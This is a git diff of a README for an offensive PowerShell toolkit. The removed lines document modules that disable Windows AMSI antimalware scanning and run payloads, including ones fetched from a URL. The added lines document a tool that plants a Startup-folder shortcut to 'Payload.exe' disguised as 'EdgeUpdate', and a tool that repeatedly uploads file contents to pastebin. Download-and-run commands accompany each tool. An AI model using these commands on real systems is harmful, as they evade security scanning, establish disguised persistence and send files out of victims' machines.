@@ -1,48 +1,49 @@
-## Module Name
-   <b><i>AMSBP.ps1</i></b>
+## Open-Directory.ps1
 
-|Function name|Description|Privileges|Notes|
+|Cmdlet Name|Description|Privileges|Notes|
 |---|---|---|---|
-|AMSBP|Disable AMSI within current process|User Land|[Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/AMSBP.png)|
+|Open-Directory|Use GUI to open the sellected directory|User Land|[Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/AMSBP.png)|
 
+**Download cmdLet:**
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/AMSBP.ps1" -OutFile "AMSBP.ps1"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Out-FileFormat/Open-Directory.ps1" -OutFile "Open-Directory.ps1"
 ```
 
+**execute:**
 ```powershell
-Import-Module -Name ".\AMSBP.ps1" -Force
-AMSBP
+.\Open-Directory.ps1
 ```
 
 <br />
 
-## Module Name
-   <b><i>Disable-Amsi.ps1</i></b>
+## Out-shortcut.ps1
    
-|Function Name|Description|Privileges|Notes|
+|Cmdlet Name|Description|Privileges|Notes|
 |---|---|---|---|
-|Disable-Amsi|disable AMSI within current process using well<br />known techniques laid out in an unsignatured way</i></b>|User Land|3 bypass technics available (auto-sellection)<br />[Disable-Amsi cmdlet Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/Disable-Amsi.png)|
+|Out-shortcut|Creates an shortcut file that accepts cmdline arguments to execute|User Land|[Disable-Amsi cmdlet Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/Disable-Amsi.png)|
 
+**download cmdLet:**
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/Disable-Amsi.ps1" -OutFile "Disable-Amsi.ps1"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Out-FileFormat/Out-shortcut.ps1" -OutFile "Out-shortcut.ps1"
 ```
 
+**execute:**
 ```powershell
-Import-Module -Name ".\Disable-Amsi.ps1" -Force
-Disable-Amsi -DontDisableBlockLogging "true"
+#Create shortcut pointing to '$Env:TMP\Payload.exe' on startup folder with 'EdgeUpdate' description
+.\Out-Shortcut.ps1 -shortcut "$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -target "$Env:TMP\Payload.exe" -description "EdgeUpdate"
 ```   
 
 <br />
 
-## Module Name
-   <b><i>Invoke-Bypass.ps1</i></b>
+## SendToPasteBin.ps1
    
 |Cmdlet Name|Description|Privileges|Notes|
 |---|---|---|---|
-|Invoke-Bypass|disable AMSI within current process + exec script through bypass?|User Land|3 bypass technics available (manual)|
+|SendToPasteBin|Get filepath contents and paste it to pastebin.|User Land||[Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/Disable-Amsi.png)|
 
+**download cmdLet:**
 ```powershell
-iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/Invoke-Bypass.ps1" -OutFile "Invoke-Bypass.ps1"
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Out-FileFormat/SendToPasteBin.ps1" -OutFile "SendToPasteBin.ps1"
 ```
 
 **prerequisites:**
@@ -51,11 +52,13 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-B
 -payloadurl 'string' only accepts .ps1 .bat .vbs file formats
 ```
 
+**execute:**
 ```powershell
-Get-Help .\Invoke-Bypass.ps1 -full
-.\Invoke-Bypass.ps1 -list "technic"
-.\Invoke-Bypass.ps1 -technic "1"
-.\Invoke-Bypass.ps1 -technic "2" -filepath "payload.ps1"
-.\Invoke-Bypass.ps1 -technic "3" -filepath "payload.ps1" -fileargs "-action 'true'"
-.\Invoke-Bypass.ps1 -technic "2" -payloadUrl "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/sysinfo.ps1" -fileargs "-sysinfo enum"
+Get-Help .\SendToPasteBin.ps1 -full
+
+#Get the contents of -filepath 'string' and creates a new pastebin paste from it on the sellected pastebin account.
+.\SendToPasteBin.ps1 -FilePath "test.log" -PastebinUsername "r00t-3xp10it" -PastebinPassword "MyS3cr3TPassword"
+
+#Get the contents of -filepath 'string' and creates a new pastebin paste from it each 120 seconds a max of 10 pastes on the sellected pastebin account.
+.\SendToPasteBin.ps1 -FilePath "test.log" -timeout "120" -maxpastes "10" -PastebinUsername "r00t-3xp10it" -PastebinPassword "MyS3cr3TPassword"
 ```   
